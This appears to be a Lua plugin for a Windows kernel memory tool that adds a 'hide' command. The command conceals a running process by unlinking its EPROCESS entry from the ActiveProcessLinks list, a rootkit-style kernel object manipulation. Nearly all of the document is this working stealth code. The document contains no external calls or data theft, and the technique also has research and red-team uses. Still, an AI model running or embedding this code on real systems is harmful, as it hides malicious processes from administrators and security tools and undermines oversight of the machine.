-- Hide a process from EPROCESS-list enumeration by unlinking it from
-- ActiveProcessLinks; the process keeps running because thread scheduling
-- uses a separate list

register_command("hide", "Unlink a process from ActiveProcessLinks.\n(usage: hide <pid|name>)", {"process"}, function(target)
    if not target then
        ntos.command_usage()
        return
    end

    local p = ntos.process(target)
    local apl = p.eprocess + ntos.offset_of("_EPROCESS", "ActiveProcessLinks")
    local flink = ntos.read_qword(apl)       -- Flink at offset 0 of _LIST_ENTRY
    local blink = ntos.read_qword(apl + 8)   -- Blink at offset 8

    ntos.write_qword(blink, flink)       -- prev->Flink = next
    ntos.write_qword(flink + 8, blink)   -- next->Blink = prev
    ntos.write_qword(apl, apl)           -- self-link so the victim's own list is well-formed
    ntos.write_qword(apl + 8, apl)

    print(("hid %s (pid %d) from process list"):format(p.name, p.pid))
end)
